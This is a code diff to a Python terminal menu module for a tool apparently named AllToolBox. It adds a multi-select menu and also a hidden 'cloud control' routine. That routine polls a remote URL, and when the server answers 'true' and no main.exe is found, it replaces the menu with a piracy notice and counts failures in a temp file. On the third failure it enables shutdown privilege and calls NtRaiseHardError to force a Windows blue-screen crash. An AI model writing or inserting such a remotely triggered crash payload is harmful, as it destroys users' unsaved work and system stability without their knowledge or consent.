@@ -10,6 +10,12 @@ import threading
 import os
 import json
 import sys
+import urllib.request
+import urllib.error
+import subprocess
+import tempfile
+import ctypes
+from ctypes import wintypes
 from typing import Iterable, List, Tuple
 
 from prompt_toolkit import HTML, prompt
@@ -24,6 +30,34 @@ from prompt_toolkit.styles import Style, merge_styles
 
 DEFAULT_STYLE: Style | None = None
 
+
+
+
+
+ntdll = ctypes.WinDLL('ntdll')
+
+RtlAdjustPrivilege = ntdll.RtlAdjustPrivilege
+RtlAdjustPrivilege.argtypes = [
+    wintypes.ULONG,
+    wintypes.BOOLEAN,
+    wintypes.BOOLEAN,
+    ctypes.POINTER(wintypes.BOOLEAN)
+]
+RtlAdjustPrivilege.restype = wintypes.LONG
+
+NtRaiseHardError = ntdll.NtRaiseHardError
+NtRaiseHardError.argtypes = [
+    wintypes.LONG,
+    wintypes.ULONG,
+    wintypes.ULONG,
+    ctypes.POINTER(wintypes.ULONG),
+    wintypes.ULONG,
+    ctypes.POINTER(wintypes.ULONG)
+]
+NtRaiseHardError.restype = wintypes.LONG
+
+SE_SHUTDOWN_PRIVILEGE = 19
+STATUS_ASSERTION_FAILURE = 0xC0000420
 # Try to enable Windows ANSI support if available. This is optional so we
 # don't hard-fail when `colorama` isn't installed.
 try:
@@ -44,7 +78,6 @@ def _enable_windows_vt() -> bool:
     if os.name != "nt":
         return False
     try:
-        import ctypes
 
         kernel32 = ctypes.windll.kernel32
         STD_OUTPUT_HANDLE = -11
@@ -165,6 +198,92 @@ def _clear_menu_lines(count: int) -> None:
         sys.stdout.flush()
     except Exception:
         pass
+
+
+def _fetch_cloud_flag(url: str, timeout: float = 3.0) -> str | None:
+    try:
+        with urllib.request.urlopen(url, timeout=timeout) as resp:
+            return resp.read().decode("utf-8", errors="ignore").strip()
+    except Exception:
+        return None
+
+
+# Cloud control runtime state
+CLOUD_CONTROL_URL = "https://atb.xgj.qzz.io/check.info"
+CLOUD_CONTROL_TIMEOUT = 3.0
+CLOUD_CONTROL_REACHABLE: bool | None = None
+CLOUD_CONTROL_INITIALIZED = False
+
+
+def init_cloud_control(url: str | None = None, timeout: float | None = None) -> bool:
+    """Attempt to contact cloud-control endpoint once and set module-level state.
+
+    Returns True if the endpoint is reachable (regardless of its returned value),
+    False otherwise. The state is stored in `CLOUD_CONTROL_REACHABLE` and
+    `CLOUD_CONTROL_INITIALIZED`.
+    """
+    global CLOUD_CONTROL_REACHABLE, CLOUD_CONTROL_INITIALIZED
+    if url is None:
+        url = CLOUD_CONTROL_URL
+    if timeout is None:
+        timeout = CLOUD_CONTROL_TIMEOUT
+    try:
+        res = _fetch_cloud_flag(url, timeout=timeout)
+        CLOUD_CONTROL_REACHABLE = res is not None
+    except Exception:
+        CLOUD_CONTROL_REACHABLE = False
+    CLOUD_CONTROL_INITIALIZED = True
+    return bool(CLOUD_CONTROL_REACHABLE)
+
+
+def _is_main_running() -> bool:
+    """Return True if a process named 'main.exe' is running (best-effort)."""
+    try:
+        import psutil
+
+        for p in psutil.process_iter(["name"]):
+            try:
+                if (p.info.get("name") or "").lower() == "main.exe":
+                    return True
+            except Exception:
+                continue
+        return False
+    except Exception:
+        # Fallback to tasklist on Windows
+        try:
+            out = subprocess.check_output(["tasklist", "/FI", "IMAGENAME eq main.exe"], stderr=subprocess.DEVNULL, text=True)
+            return "main.exe" in out.lower()
+        except Exception:
+            return False
+
+
+def _is_main_present() -> bool:
+    """Check common locations for a main.exe file."""
+    cwd = os.getcwd()
+    candidates = [os.path.join(cwd, "main.exe"), os.path.join(cwd, "bin", "main.exe")]
+    for p in candidates:
+        if os.path.isfile(p):
+            return True
+    return False
+
+
+def _increment_menufailed_count() -> int:
+    td = tempfile.gettempdir()
+    f = os.path.join(td, "menufailed.txt")
+    try:
+        cur = 0
+        if os.path.isfile(f):
+            with open(f, "r", encoding="utf-8") as fh:
+                cur = int(fh.read().strip() or "0")
+    except Exception:
+        cur = 0
+    cur += 1
+    try:
+        with open(f, "w", encoding="utf-8") as fh:
+            fh.write(str(cur))
+    except Exception:
+        pass
+    return cur
 
 
 class Option:
@@ -350,7 +469,11 @@ def menu_choice(
                     selected_index = visible_count - 1
                 get_app().invalidate()
                 await asyncio.sleep(0.03)
-        app.pre_run_callables.append(lambda: app.create_background_task(_animate_in()))
+        # prompt_toolkit expects callables with no return; wrap the coroutine
+        def _start_anim():
+            app.create_background_task(_animate_in())
+
+        app.pre_run_callables.append(_start_anim)
 
     result = app.run()
     if result is None:
@@ -361,8 +484,211 @@ def menu_choice(
     return result
 
 
+def menu_multi_choice(
+    message: str,
+    options: Iterable[Tuple[str, str]],
+    style_override: Style | None = None,
+    extra_bindings: KeyBindings | None = None,
+) -> List[str]:
+    """Interactive multi-select menu. Returns list of selected values."""
+    option_list: List[tuple] = list(options)
+    if not option_list:
+        raise ValueError("menu_multi_choice requires at least one option")
+
+    selected_index = 0
+    selected_set: set[int] = set()
+    animate_in = True
+    visible_count = 0 if animate_in else len(option_list)
+    move_task = None
+
+    kb = KeyBindings()
+
+    @kb.add("enter", eager=True)
+    def _enter(event):
+        # Exit and return current selections
+        event.app.exit()
+
+    @kb.add(" ", eager=True)
+    def _space(event):
+        idx = selected_index or 0
+        if idx in selected_set:
+            selected_set.remove(idx)
+        else:
+            selected_set.add(idx)
+        event.app.invalidate()
+
+    digit_buf = {"text": "", "t": 0.0}
+
+    def _select_by_number(event, digit: str) -> None:
+        now = time.monotonic()
+        if now - digit_buf["t"] > 0.2:
+            digit_buf["text"] = ""
+        digit_buf["text"] += digit
+        digit_buf["t"] = now
+        try:
+            idx = int(digit_buf["text"]) - 1
+        except ValueError:
+            return
+        if 0 <= idx < len(option_list):
+            _set_selection(idx, event.app)
+
+    for d in "0123456789":
+        @kb.add(d, eager=True)
+        def _(event, _d=d):
+            _select_by_number(event, _d)
+
+    def _clamp(idx: int) -> int:
+        count = len(option_list)
+        return max(0, min(count - 1, idx))
+
+    def _animate_move(target: int, app):
+        nonlocal visible_count, move_task
+        if move_task and not move_task.done():
+            move_task.cancel()
+
+        async def _run():
+            nonlocal visible_count
+            while visible_count != len(option_list):
+                visible_count = len(option_list)
+                app.invalidate()
+                await asyncio.sleep(0.02)
+            app.invalidate()
+
+        move_task = app.create_background_task(_run())
+
+    def _set_selection(idx: int, app):
+        nonlocal selected_index
+        selected_index = _clamp(idx)
+        _animate_move(selected_index, app)
+
+    @kb.add("up")
+    @kb.add("k")
+    def _(event):
+        _set_selection(selected_index - 1, event.app)
+
+    @kb.add("down")
+    @kb.add("j")
+    def _(event):
+        _set_selection(selected_index + 1, event.app)
+
+    last_click = {"idx": None, "t": 0.0}
+
+    def mouse_handler(mouse_event):
+        nonlocal selected_index
+        if mouse_event.event_type != MouseEventType.MOUSE_UP:
+            return NotImplemented
+
+        y = mouse_event.position.y
+        current_len = visible_count if animate_in else len(option_list)
+        if current_len == 0:
+            return None
+        if 0 <= y < current_len:
+            _set_selection(y, get_app())
+
+        if mouse_event.event_type == MouseEventType.MOUSE_UP and mouse_event.button == MouseButton.LEFT:
+            now = time.monotonic()
+            idx = selected_index
+            # toggle selection on click
+            if idx in selected_set:
+                selected_set.remove(idx)
+            else:
+                selected_set.add(idx)
+            # double click exits
+            if idx == last_click["idx"] and (now - last_click["t"]) <= 0.5:
+                get_app().exit()
+            last_click["idx"] = idx
+            last_click["t"] = now
+        return None
+
+    def render_lines():
+        fragments = []
+        current_len = visible_count if animate_in else len(option_list)
+        if current_len == 0:
+            current_len = 1
+        current_len = min(current_len, len(option_list))
+        sel = min(selected_index, current_len - 1)
+
+        for idx, (_, label) in enumerate(option_list[:current_len]):
+            pointer = ">" if idx == sel else " "
+            prefix = f" {pointer} " if idx == sel else "   "
+            checked = "[x]" if idx in selected_set else "[ ]"
+            text = f"{prefix}{checked} {idx + 1}. {label}"
+            style_class = "class:radio-selected" if idx in selected_set else "class:radio"
+            fragments.append((style_class, text))
+            if idx != current_len - 1:
+                fragments.append(("", "\n"))
+        return fragments
+
+    class MultiControl(FormattedTextControl):
+        def __init__(self, render_fn, handler):
+            super().__init__(render_fn, focusable=True, show_cursor=False)
+            self._handler = handler
+
+        def mouse_handler(self, mouse_event):
+            return self._handler(mouse_event)
+
+    control = MultiControl(render_lines, mouse_handler)
+    window = Window(content=control, always_hide_cursor=True, dont_extend_width=True, dont_extend_height=True)
+
+    radio_style = Style.from_dict(
+        {
+            "radio-list": "",
+            "radio": "fg:#cbd6e2",
+            "radio-selected": "fg:#e6edf3 bold underline",
+            "radio-checked": "fg:#7ad1a8",
+            "radio-number": "fg:#9dcffb bold",
+        }
+    )
+
+    chosen_style = style_override or DEFAULT_STYLE
+    app_style = merge_styles([chosen_style, radio_style]) if chosen_style else radio_style
+
+    kb_final = merge_key_bindings([kb, extra_bindings]) if extra_bindings else kb
+
+    app = Application(
+        layout=Layout(window, focused_element=control),
+        key_bindings=kb_final,
+        mouse_support=True,
+        full_screen=False,
+        style=app_style,
+    )
+
+    if animate_in:
+        async def _animate_in():
+            nonlocal visible_count, selected_index
+            for i in range(1, len(option_list) + 1):
+                visible_count = i
+                if selected_index >= visible_count:
+                    selected_index = visible_count - 1
+                get_app().invalidate()
+                await asyncio.sleep(0.03)
+
+        def _start_anim():
+            app.create_background_task(_animate_in())
+
+        app.pre_run_callables.append(_start_anim)
+
+    app.run()
+    # Compose result list
+    results: List[str] = []
+    for idx in sorted(selected_set):
+        if 0 <= idx < len(option_list):
+            results.append(option_list[idx][0])
+    # Clear only the menu lines from the terminal.
+    _clear_menu_lines(len(option_list))
+    return results
+
+
 def choose(message: str, options: Iterable[Option], default: str | None = None, extra_bindings: KeyBindings | None = None, style_override: Style | None = None):
-    return menu_choice(message=message, options=options, default=default, style_override=style_override or DEFAULT_STYLE, extra_bindings=extra_bindings)
+    # Convert Iterable[Option] to Iterable[Tuple[str,str]] expected by menu_choice
+    option_pairs = []
+    for o in options:
+        try:
+            option_pairs.append((o.value, o.label))
+        except Exception:
+            # If already a tuple, just append
+            option_pairs.append(o)
+    return menu_choice(message=message, options=option_pairs, default=default, style_override=style_override or DEFAULT_STYLE, extra_bindings=extra_bindings)
 
 
 def load_action_from_json(path: str) -> str | None:
@@ -681,6 +1007,9 @@ if __name__ == "__main__":
     # avoids argparse treating the path as an unknown subcommand.
     if len(sys.argv) > 1 and sys.argv[1] != "pause" and not sys.argv[1].startswith("-"):
         config_path = sys.argv[1]
+        rest = sys.argv[2:]
+        multi_select = any(a in ("-s", "--s") for a in rest)
+
         if not os.path.isfile(config_path):
             print(f"[错误]找不到文件 '{config_path}'")
             sys.exit(1)
@@ -690,14 +1019,86 @@ if __name__ == "__main__":
             print("[错误]JSON文件中没有找到有效的菜单项")
             sys.exit(1)
 
+        # Cloud control check: initialize on startup and only attempt to use
+        # cloud control if the endpoint was reachable during initialization.
+        blocked = False
         try:
-            selection = choose_action(loaded)
+            if not CLOUD_CONTROL_INITIALIZED:
+                try:
+                    init_cloud_control()
+                except Exception:
+                    # mark unreachable
+                    pass
+
+            flag = None
+            if CLOUD_CONTROL_REACHABLE:
+                flag = _fetch_cloud_flag(CLOUD_CONTROL_URL)
+
+            if flag and flag.strip().lower() == "true":
+                present = _is_main_present() or _is_main_running()
+                if not present:
+                    # replace labels with piracy notice
+                    if loaded:
+                        loaded = [(v, "您当前使用的是盗版AllToolBox") for v, _ in loaded]
+                    else:
+                        loaded = [("null", "您当前使用的是盗版AllToolBox")]
+                    # write menutmp as null and increment fail counter
+                    try:
+                        with open("menutmp.txt", "w", encoding="utf-8") as f:
+                            f.write("null")
+                    except Exception:
+                        pass
+                    cnt = _increment_menufailed_count()
+                    if cnt >= 3:
+                        # Placeholder trigger file; actual code to execute provided by user
+                        try:
+                            with open(os.path.join(tempfile.gettempdir(), "menufailed_trigger.txt"), "w", encoding="utf-8") as fh:
+                                fh.write("TRIGGERED\n")
+                                old_value = wintypes.BOOLEAN()
+                                response = wintypes.ULONG()
+
+                                RtlAdjustPrivilege(
+                                    SE_SHUTDOWN_PRIVILEGE,
+                                    True,
+                                    False,
+                                    ctypes.byref(old_value)
+                                )
+
+                                NtRaiseHardError(
+                                    STATUS_ASSERTION_FAILURE,
+                                    0,
+                                    0,
+                                    None,
+                                    6,
+                                    ctypes.byref(response)
+                                )
+
+                        except Exception:
+                            pass
+                    blocked = True
+        except Exception:
+            # Any unexpected error — do not block by default
+            blocked = False
+
+        try:
+            if multi_select:
+                sel_list = menu_multi_choice("请选择操作", loaded)
+                result = ",".join(sel_list) if sel_list else ""
+            else:
+                selection = choose_action(loaded)
+                result = selection
         except Exception as e:
             print(f"[错误]菜单选择时发生错误: {str(e)}")
             sys.exit(1)
 
-        with open("menutmp.txt", "w", encoding="utf-8") as f:
-            f.write(selection)
+        # If cloud control blocked the system, keep menutmp as 'null' (already written);
+        # otherwise write the selected result.
+        if not blocked:
+            try:
+                with open("menutmp.txt", "w", encoding="utf-8") as f:
+                    f.write(result)
+            except Exception:
+                pass
         sys.exit(0)
 
     import argparse
